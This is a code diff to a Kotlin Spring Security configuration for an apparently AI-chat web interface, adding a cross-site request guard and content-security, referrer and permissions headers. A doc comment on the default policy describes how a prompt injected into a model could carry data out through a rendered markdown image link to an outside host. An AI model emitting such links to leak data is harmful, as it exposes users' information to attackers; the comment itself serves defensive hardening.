@@ -67,12 +67,37 @@ class SecurityConfig {
          * decides which of them belong here.
          */
         githubUsers: OAuth2UserService<OAuth2UserRequest, OAuth2User>?,
+        /** Where the interface is served from, for the cross-site check and the headers. */
+        web: WebProperties,
     ): SecurityFilterChain {
         http {
             cors { }
-            // The API is cookie-session based; a CSRF token flow still needs adding
-            // before this is exposed anywhere but a dev machine.
+            /*
+             * Spring's CSRF token is off because the same protection is had
+             * without one: [CrossSiteRequestGuard], added below, refuses any
+             * write a browser says came from another site. See it for why a
+             * check on Origin and Sec-Fetch-Site rather than a token. Issue #588.
+             */
             csrf { disable() }
+            /*
+             * The response headers, now that the server serves the interface
+             * itself (#585) and nginx is not there to have been forgotten in.
+             * Spring Security's defaults stay - nosniff, X-Frame-Options DENY,
+             * no caching of API answers, HSTS on a request that arrived over
+             * TLS - and these are added. Each writer leaves a header alone
+             * where the response already set one, which is what lets an
+             * attachment carry its own sandboxing policy. Issue #588.
+             */
+            headers {
+                contentSecurityPolicy { policyDirectives = web.contentSecurityPolicy.ifBlank { DEFAULT_CONTENT_SECURITY_POLICY } }
+                referrerPolicy { policy = org.springframework.security.web.header.writers.ReferrerPolicyHeaderWriter.ReferrerPolicy.SAME_ORIGIN }
+                addHeaderWriter(
+                    org.springframework.security.web.header.writers.StaticHeadersWriter(
+                        "Permissions-Policy",
+                        PERMISSIONS_POLICY,
+                    ),
+                )
+            }
             httpBasic { disable() }
             formLogin { disable() }
             logout { disable() }
@@ -255,6 +280,13 @@ class SecurityConfig {
         http.addFilterBefore(tokens, UsernamePasswordAuthenticationFilter::class.java)
 
         /*
+         * Behind CORS and ahead of everything that reads who is calling: a write
+         * a browser says came from another site is refused before anything is
+         * looked up for it. Issue #588.
+         */
+        http.addFilterAfter(CrossSiteRequestGuard(web), org.springframework.web.filter.CorsFilter::class.java)
+
+        /*
          * The one place authentication is turned off, and it is an `if` on a bound
          * enum rather than a condition on a bean.
          *
@@ -322,9 +354,36 @@ class SecurityConfig {
         }
     }
 
-    private companion object {
+    companion object {
         /** What [metricsAccess] answers once an administrator has opened the door. */
-        val OPEN = AuthorizationDecision(true)
+        private val OPEN = AuthorizationDecision(true)
+
+        /**
+         * What the interface may load, run and reach, when the configuration
+         * names no policy of its own. Issue #588.
+         *
+         * Scripts, styles, connections, workers and frames from this origin
+         * only - the bundle is self-contained. Inline styles because the editor
+         * writes its own; workers for the editor and the PDF preview; frames
+         * from this origin for an artifact's preview, which carries a sandbox
+         * policy of its own. Nothing may frame the interface.
+         *
+         * **Images are the exception, and a decision left open on #588.** An
+         * answer that links to pictures draws them (picture-links-check), so
+         * `https:` pictures load from anywhere. That is also the road a prompt
+         * injected into a model would carry data out by - `![](https://x/?q=…)`
+         * is fetched the moment it is drawn. An installation that would rather
+         * lose the previews sets ORKNUX_CONTENT_SECURITY_POLICY with `img-src
+         * 'self' data: blob:`.
+         */
+        const val DEFAULT_CONTENT_SECURITY_POLICY =
+            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
+                "img-src 'self' data: blob: https:; media-src 'self' data: blob:; font-src 'self' data:; " +
+                "connect-src 'self'; worker-src 'self' blob:; frame-src 'self'; " +
+                "frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'"
+
+        /** The microphone for dictation on this origin; the rest of the device for nobody. */
+        const val PERMISSIONS_POLICY = "camera=(), geolocation=(), payment=(), usb=(), microphone=(self)"
     }
 }
 
